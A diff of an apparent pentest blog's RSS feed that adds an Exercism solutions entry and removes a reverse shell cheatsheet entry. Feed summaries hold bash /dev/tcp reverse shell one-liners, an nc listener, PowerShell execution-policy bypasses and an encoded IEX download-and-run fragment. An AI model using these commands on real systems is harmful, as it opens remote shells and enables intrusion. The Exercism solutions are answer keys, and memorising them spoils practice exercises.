@@ -7,6 +7,16 @@
     <generator>Hugo -- gohugo.io</generator>
     <copyright>2022</copyright><atom:link href="https://www.grayhatfreelancing.com/index.xml" rel="self" type="application/rss+xml" />
     <item>
+      <title>Exercism Solutions</title>
+      <link>https://www.grayhatfreelancing.com/docs/exercism_solutions/</link>
+      <pubDate>Sat, 28 Jan 2023 00:00:00 +0000</pubDate>
+      
+      <guid>https://www.grayhatfreelancing.com/docs/exercism_solutions/</guid>
+      <description>Exercism Solutions # These solutions are provided so that you can check your work or get an idea, if you&amp;rsquo;re stuck. If you use them to cheat, understand that you&amp;rsquo;re only cheating yourself. That goes for everything on this website.
+Python # armstrong numbers # import math def is_armstrong_number(number): &amp;#34;&amp;#34;&amp;#34; A number is an &amp;#34;armstrong&amp;#34; number if the sum of the powers of it&amp;#39;s length applied to each digit in the number adds up to the number :param number: int - returns True if number is an amrstrong &amp;#34;&amp;#34;&amp;#34; power = len(str(number)) sums = [] for i in str(number): sums.</description>
+    </item>
+    
+    <item>
       <title>Brute Force Cracking</title>
       <link>https://www.grayhatfreelancing.com/docs/brute_force_cracking/</link>
       <pubDate>Sun, 15 Jan 2023 00:00:00 +0000</pubDate>
@@ -298,15 +308,6 @@ Get-SQLDatabase -Username sa -Password Password1234 -Instance &amp;#34;&amp;lt;D
       
       <guid>https://www.grayhatfreelancing.com/docs/powershell_cheatsheet/</guid>
       <description>Powershell # Summary # Execution Policy Encoded Commands Download file Load Powershell scripts Load C# assembly reflectively Secure String to Plaintext References Execution Policy # powershell -EncodedCommand $encodedCommand powershell -ep bypass ./PowerView.ps1 # Change execution policy Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted Set-ExecutionPolicy Bypass -Scope Process Constrained Mode # # Check if we are in a constrained mode # Values could be: FullLanguage or ConstrainedLanguage $ExecutionContext.SessionState.LanguageMode ## Bypass powershell -version 2 Encoded Commands # Windows $command = &amp;#39;IEX (New-Object Net.</description>
-    </item>
-    
-    <item>
-      <title>Reverse Shell Cheatsheet</title>
-      <link>https://www.grayhatfreelancing.com/docs/reverse_shell_cheatsheet/</link>
-      <pubDate>Thu, 03 Nov 2022 00:00:00 +0000</pubDate>
-      
-      <guid>https://www.grayhatfreelancing.com/docs/reverse_shell_cheatsheet/</guid>
-      <description>Reverse Shell Cheat Sheet # Tools # reverse-shell-generator - Hosted Reverse Shell generator (source) revshellgen - CLI Reverse Shell generator Reverse Shell # Bash TCP # bash -i &amp;gt;&amp;amp; /dev/tcp/10.0.0.1/4242 0&amp;gt;&amp;amp;1 0&amp;lt;&amp;amp;196;exec 196&amp;lt;&amp;gt;/dev/tcp/10.0.0.1/4242; sh &amp;lt;&amp;amp;196 &amp;gt;&amp;amp;196 2&amp;gt;&amp;amp;196 /bin/bash -l &amp;gt; /dev/tcp/10.0.0.1/4242 0&amp;lt;&amp;amp;1 2&amp;gt;&amp;amp;1 Bash UDP # Victim: sh -i &amp;gt;&amp;amp; /dev/udp/10.0.0.1/4242 0&amp;gt;&amp;amp;1 Listener: nc -u -lvp 4242 Don&amp;rsquo;t forget to check with others shell : sh, ash, bsh, csh, ksh, zsh, pdksh, tcsh, bash</description>
     </item>
     
   </channel>
